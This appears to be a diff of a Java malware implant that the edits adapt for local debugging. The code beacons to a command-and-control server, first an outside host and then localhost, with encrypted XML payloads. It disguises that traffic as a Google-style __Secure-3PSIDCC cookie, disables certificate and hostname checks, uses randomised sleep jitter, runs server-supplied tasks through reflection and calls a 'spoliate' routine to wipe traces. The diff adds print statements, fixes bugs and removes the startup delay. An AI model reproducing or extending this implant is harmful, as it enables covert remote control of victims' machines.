@@ -4,6 +4,7 @@ import java.io.FileReader;
 import java.io.StringWriter;
 import java.io.IOException;
 import java.io.OutputStreamWriter;
+import java.io.StringReader;
 import java.lang.management.ManagementFactory;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
@@ -17,6 +18,7 @@ import org.w3c.dom.Document;
 import org.w3c.dom.Element;
 import org.w3c.dom.Node;
 import org.w3c.dom.NodeList;
+import org.xml.sax.InputSource;
 import org.xml.sax.SAXException;
 
 import javax.xml.parsers.DocumentBuilderFactory;
@@ -63,7 +65,7 @@ class nConfig
     public static int locTcpPort = 49602;
     public static String encKey = "A54f6YY2_1@31395b5v5+9592_4081l0";
     public static int metastasize = 0;
-    public static String uri = "https://wideking.git-monitor.com/ncs/1.jsp";
+    public static String uri = "https://127.0.0.1";
     public static int isKeystone = 0;
     public static int stutterMin = 10;
     public static int stutterMax = 50;
@@ -88,7 +90,7 @@ public class nCore
     static private utilitarian nUtil = new utilitarian();
     static private pkgLib packager = new pkgLib();
 
-    public static void Main(String[] args) throws ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
+    public static void main(String[] args) throws ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
     {
         //add execution delay of 10 minutes +/- to 1st stage
         sessUUID = UUID.randomUUID().toString();
@@ -102,11 +104,12 @@ public class nCore
             cm.spoliate();
         }
 
+        System.out.println("waiting");
         //execute initial 
         //start loop
         //if no authentication has occurred before, the keepalive will find autolib and a task object for metadata and to start the metastasizer
-        TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(19,37))*1000);
-
+        //TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(19,37))*1000);
+        System.out.println("wait is over");
         keepalive();
     }
 
@@ -123,7 +126,9 @@ public class nCore
         {
             try
             {  
+                System.out.println(nComm.mkAuth());
                 String cReq = nComm.request(nComm.mkAuth(),"auth");
+
                 if (cReq != "null")
                 {
                     Hashtable xmlResponse = nUtil.xmlStringToParseable(cReq);    
@@ -138,7 +143,7 @@ public class nCore
                     {
                         tasks.add(taskSet);
                     }
-                    
+                    System.out.println("success");
                 }
                 else
                 {
@@ -147,6 +152,7 @@ public class nCore
             }
             catch (Exception e)
             {
+                System.out.println(e.getMessage());
                 continue;
             }
         }
@@ -155,6 +161,7 @@ public class nCore
         }
         else
         {
+            System.out.println("spoliating");
             cm.spoliate();
         }
     }
@@ -386,6 +393,7 @@ public class nCore
     private static class utilitarian
     {
 	
+        
 	    public static int rngenerator(int min, int max) throws NoSuchAlgorithmException 
         {
 		    SecureRandom rHandle = SecureRandom.getInstance("SHA1PRNG");
@@ -398,7 +406,7 @@ public class nCore
             Hashtable methObj = new Hashtable();
             try
             {
-                Method cMethodical = cData.getMethod(methodName,null);
+                Method cMethodical = cData.getMethod(methodName,String[].class);
                 methObj.put("methodical",cMethodical);
                 methObj.put("error","null");
             }
@@ -420,7 +428,7 @@ public class nCore
 
             DocumentBuilderFactory manufactorum = DocumentBuilderFactory.newInstance();
             DocumentBuilder constructor = manufactorum.newDocumentBuilder();
-            Document doc = constructor.parse(input);
+            Document doc = constructor.parse(new InputSource(new StringReader(input)));
 
             Element rootElement = doc.getDocumentElement();
 
@@ -477,6 +485,7 @@ public class nCore
             {
                 String key = k.nextElement();
                 Element kElement = doc.createElement(key.toString());
+
                 kElement.setAttribute(
                     "data",
                     output.get(key.toString())
@@ -533,6 +542,7 @@ public class nCore
         }
     }
 
+    
     private static class network
     {
         private String mkAuth() throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
@@ -540,13 +550,8 @@ public class nCore
             Hashtable<String,String> authData = new Hashtable<>();
             utilitarian nUtil = new utilitarian();
             security nSec = new security();
-            
-            byte[] passCrypt = nSec.encrypt(
-                nConfig.passMat.getBytes(),
-                nonce.getBytes()
-            );
 
-            authData.put("aKey",new String(Base64.getEncoder().encode(passCrypt)));
+            authData.put("aKey",nConfig.passMat);
 
             return nUtil.xmlDocToString(nUtil.outputToXmlDoc("init",authData));
 
@@ -561,7 +566,7 @@ public class nCore
             SSLContext sslCon = SSLContext.getInstance("TLS");
             sslCon.init(null, new TrustManager[] {new InvalidCertificateTrustManager()}, null);
             
-            String fmtUri = String.format("%s%s",nConfig.uri,nConfig.endpoints.get(endpointType).toString());
+            String fmtUri = String.format("%s/%s",nConfig.uri,nConfig.endpoints.get(endpointType).toString());
 
             URL ctrlUrl = new URI(fmtUri).toURL();
 
@@ -576,31 +581,44 @@ public class nCore
                     "Cookie",
                     String.format(
                         "__Secure-3PSIDCC=%s; uuid=%s",
-                        new String(Base64.getEncoder().encode(cookieData.getBytes())),
+                        new String(Base64.getUrlEncoder().encode(cookieData.getBytes())),
                         sessUUID
                     )
                 );
 
-                connMan.setHostnameVerifier(new InvalidCertificateHostVerifier());
+                HttpsURLConnection.setDefaultSSLSocketFactory(sslCon.getSocketFactory());
+
+                HostnameVerifier allHostsValid = new HostnameVerifier() {
+                    public boolean verify(String hostname, SSLSession session) {
+                     return true;
+                   }
+                };
+                connMan.setHostnameVerifier(allHostsValid);
 
                 OutputStreamWriter connOutWriter = new OutputStreamWriter(connMan.getOutputStream());
-                
-                connOutWriter.write(
-                    new String(
-                        Base64.getEncoder().encode(
-                            secInst.encrypt(
-                                postData.getBytes(), 
-                                nonce.getBytes()
-                            )
+
+                String postBlob = new String(
+                    Base64.getUrlEncoder().encode(
+                        secInst.encrypt(
+                            postData.getBytes(), 
+                            nonce.getBytes()
                         )
                     )
                 );
+
+                System.out.println(postBlob);
+
+                connOutWriter.write(
+                    postBlob
+                );
                 
+                System.out.println("sending to server");
 
                 connOutWriter.close();
 
                 if (connMan.getResponseCode() == HttpsURLConnection.HTTP_OK)
                 {
+                    System.out.println("receiving data");
                     byte[] decodedResponseData = secInst.decrypt(
                         Base64.getDecoder().decode(
                             connMan.getResponseMessage()
@@ -620,12 +638,7 @@ public class nCore
             }
         }
 
-        public class InvalidCertificateHostVerifier implements HostnameVerifier{
-        @Override
-        public boolean verify(String paramString, SSLSession paramSSLSession) {
-            return true;
-        }
-}
+
 
         //stackoverflow: https://stackoverflow.com/questions/26393031/how-to-execute-a-https-get-request-from-java
         public class InvalidCertificateTrustManager implements X509TrustManager{
@@ -736,7 +749,7 @@ public class nCore
 
         private SecretKey initKey() throws Exception
         {
-            byte[] keyBytes = Base64.getDecoder().decode(nConfig.encKey);
+            byte[] keyBytes = nConfig.encKey.getBytes();
             SecretKey key = new SecretKeySpec(keyBytes, 0, keyBytes.length, "AES");
             return key;
         }
